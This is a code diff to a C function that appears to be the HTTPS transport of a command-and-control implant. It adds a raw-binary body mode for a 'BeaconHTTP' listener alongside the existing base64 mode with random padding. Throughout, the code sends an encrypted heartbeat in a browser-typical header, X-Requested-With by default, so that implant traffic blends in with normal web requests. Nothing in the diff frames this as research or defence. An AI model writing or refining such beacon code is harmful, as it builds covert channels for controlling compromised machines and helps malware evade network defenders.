@@ -119,34 +119,44 @@ const char* https_pick_header(const char* list, uint32_t idx) {
     return buf;
 }
 
-// POST the b64 payload. Body = b64(data) + random '\n' padding; the encrypted
-// beat rides in the hb_header (browser-typical header name).
+// POST the payload. raw_body=0 (https_emu listener): body = b64(data) +
+// random '\n' padding. raw_body=1 (BeaconHTTP listener): body = the raw
+// binary bytes — the beacon HTTP transport feeds the body straight into the
+// session decryptor, so no base64 (and no trailing whitespace) is wanted.
+// The encrypted beat rides in the hb_header either way.
 int https_send(ws_connector_t* ws, const char* uri, const char* user_agent,
                const char* hb_header_name, const char* beat,
-               const uint8_t* data, size_t len) {
+               const uint8_t* data, size_t len, int raw_body) {
     if (ws->state != WS_STATE_CONNECTED || ws->fd < 0) return -1;
 
-    // Base64 the payload
-    size_t b64_len = ((len + 2) / 3) * 4;
-    size_t pad = 0;
-    uint8_t rnd = 0;
-    (void)ax_random_bytes(&rnd, 1);
-    pad = (size_t)(rnd % 16);
-    size_t total = b64_len + pad;
+    uint8_t* body;
+    size_t total;
+    if (raw_body) {
+        body = (uint8_t*)data;
+        total = len;
+    } else {
+        // Base64 the payload
+        size_t b64_len = ((len + 2) / 3) * 4;
+        size_t pad = 0;
+        uint8_t rnd = 0;
+        (void)ax_random_bytes(&rnd, 1);
+        pad = (size_t)(rnd % 16);
+        total = b64_len + pad;
 
-    uint8_t* b64 = (uint8_t*)ax_malloc(b64_len + pad + 1);
-    if (!b64) return -1;
-    if (ws_b64_encode_pub(data, len, (char*)b64, b64_len + 1) != 0) {
-        ax_free(b64);
-        return -1;
+        body = (uint8_t*)ax_malloc(b64_len + pad + 1);
+        if (!body) return -1;
+        if (ws_b64_encode_pub(data, len, (char*)body, b64_len + 1) != 0) {
+            ax_free(body);
+            return -1;
+        }
+        ax_memset(body + b64_len, '\n', pad);  // whitespace padding (stripped server-side)
     }
-    ax_memset(b64 + b64_len, '\n', pad);  // whitespace padding (stripped server-side)
 
     // Build the request
     size_t cap = 512 + ax_strlen(uri) + ax_strlen(user_agent) +
                  ax_strlen(hb_header_name) + ax_strlen(beat);
     uint8_t* req = (uint8_t*)ax_malloc(cap);
-    if (!req) { ax_free(b64); return -1; }
+    if (!req) { if (!raw_body) ax_free(body); return -1; }
     size_t rl = 0;
 
 #define HS_APPEND(s) do { \
@@ -169,7 +179,8 @@ int https_send(ws_connector_t* ws, const char* uri, const char* user_agent,
 
     HS_APPEND("Accept: */*\r\n");
     HS_APPEND("Accept-Encoding: gzip, deflate\r\n");
-    HS_APPEND("Content-Type: application/json\r\n");
+    HS_APPEND(raw_body ? "Content-Type: application/octet-stream\r\n"
+                       : "Content-Type: application/json\r\n");
 
     HS_APPEND(hb_header_name ? hb_header_name : "X-Requested-With");
     HS_APPEND(": ");
@@ -193,13 +204,13 @@ int https_send(ws_connector_t* ws, const char* uri, const char* user_agent,
 #undef HS_APPEND
 
     if (ws_tls_send(ws, req, rl) != 0 ||
-        ws_tls_send(ws, b64, total) != 0) {
+        ws_tls_send(ws, body, total) != 0) {
         ax_free(req);
-        ax_free(b64);
+        if (!raw_body) ax_free(body);
         return -1;
     }
     ax_free(req);
-    ax_free(b64);
+    if (!raw_body) ax_free(body);
     return 0;
 }
 
